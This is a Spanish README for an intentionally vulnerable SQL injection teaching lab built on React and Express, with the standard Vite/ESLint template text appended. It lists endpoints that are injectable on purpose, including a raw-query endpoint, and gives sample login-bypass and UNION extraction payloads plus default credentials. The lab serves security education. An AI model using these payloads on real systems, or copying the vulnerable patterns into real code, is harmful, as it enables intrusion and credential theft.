# APE Stride - SQL Injection Lab

⚠️ **ADVERTENCIA EDUCATIVA**: Este proyecto ha sido modificado para incluir vulnerabilidades de inyección SQL con fines educativos para la materia de seguridad. **NO utilizar en producción.**

## Descripción

APE Stride es una aplicación web que combina React + TypeScript + Vite en el frontend con un backend Node.js/Express y base de datos SQLite. Ha sido modificada para incluir endpoints específicamente vulnerables que demuestran diferentes tipos de ataques de inyección SQL.

## Características del Lab

- ✅ **Aplicación funcional** con autenticación segura
- ⚠️ **Endpoints vulnerables** para demostración educativa
- 📚 **Documentación completa** de vulnerabilidades
- 🔧 **Interfaz web** para pruebas interactivas
- 📋 **Ejemplos de payloads** de inyección SQL

## Instalación y Uso

### Prerrequisitos

- Node.js (v14 o superior)
- npm o pnpm

### Instalación

```bash
# Instalar dependencias
npm install
# o
pnpm install

# Iniciar el servidor
npm start
# o
node server.js
```

### Acceso a la aplicación

- **Aplicación principal**: http://localhost:3000
- **Lab de inyecciones SQL**: http://localhost:3000/sql-lab.html

### Usuarios por defecto

- **Admin**: `admin` / `Admin123!`
- **Usuario**: `user1` / `User123!`

## Endpoints Vulnerables

⚠️ **Solo para fines educativos**

### 1. Login Vulnerable

```
POST /api/vulnerable/login
```

- Sin rate limiting
- Sin validación de entrada
- Concatenación directa de SQL

### 2. Búsqueda de Usuarios

```
GET /api/vulnerable/search?q=<query>
```

- Vulnerable a UNION attacks
- Sin sanitización de entrada

### 3. Usuario por ID

```
GET /api/vulnerable/user/:id
```

- Inyección numérica
- Sin validación de tipo

### 4. Actualizar Usuario

```
PUT /api/vulnerable/user/:id
```

- Permite modificar cualquier campo
- Sin restricciones de seguridad

### 5. Consulta SQL Cruda

```
POST /api/vulnerable/raw-query
```

- Ejecuta cualquier SQL sin restricciones
- **EXTREMADAMENTE PELIGROSO**

## Documentación

- 📖 **Guía completa**: [SQL_INJECTION_GUIDE.md](SQL_INJECTION_GUIDE.md)
- 🌐 **Interfaz web**: http://localhost:3000/sql-lab.html
- 🔧 **Ejemplos de payloads** incluidos en la interfaz

## Ejemplos Rápidos

### Bypass de Login

```json
{
  "username": "admin' OR '1'='1' --",
  "password": "cualquier_cosa"
}
```

### Extracción de Datos

```
GET /api/vulnerable/search?q=test' UNION SELECT 1,username,password,role,email,created_at FROM users --
```

### Consulta Directa

```json
{
  "query": "SELECT * FROM users"
}
```

## Arquitectura Original

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react) uses [Babel](https://babeljs.io/) (or [oxc](https://oxc.rs) when used in [rolldown-vite](https://vite.dev/guide/rolldown)) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react-swc) uses [SWC](https://swc.rs/) for Fast Refresh

## Expanding the ESLint configuration

If you are developing a production application, we recommend updating the configuration to enable type-aware lint rules:

```js
export default defineConfig([
  globalIgnores(["dist"]),
  {
    files: ["**/*.{ts,tsx}"],
    extends: [
      // Other configs...

      // Remove tseslint.configs.recommended and replace with this
      tseslint.configs.recommendedTypeChecked,
      // Alternatively, use this for stricter rules
      tseslint.configs.strictTypeChecked,
      // Optionally, add this for stylistic rules
      tseslint.configs.stylisticTypeChecked,

      // Other configs...
    ],
    languageOptions: {
      parserOptions: {
        project: ["./tsconfig.node.json", "./tsconfig.app.json"],
        tsconfigRootDir: import.meta.dirname,
      },
      // other options...
    },
  },
]);
```

You can also install [eslint-plugin-react-x](https://github.com/Rel1cx/eslint-react/tree/main/packages/plugins/eslint-plugin-react-x) and [eslint-plugin-react-dom](https://github.com/Rel1cx/eslint-react/tree/main/packages/plugins/eslint-plugin-react-dom) for React-specific lint rules:

```js
// eslint.config.js
import reactX from "eslint-plugin-react-x";
import reactDom from "eslint-plugin-react-dom";

export default defineConfig([
  globalIgnores(["dist"]),
  {
    files: ["**/*.{ts,tsx}"],
    extends: [
      // Other configs...
      // Enable lint rules for React
      reactX.configs["recommended-typescript"],
      // Enable lint rules for React DOM
      reactDom.configs.recommended,
    ],
    languageOptions: {
      parserOptions: {
        project: ["./tsconfig.node.json", "./tsconfig.app.json"],
        tsconfigRootDir: import.meta.dirname,
      },
      // other options...
    },
  },
]);
```
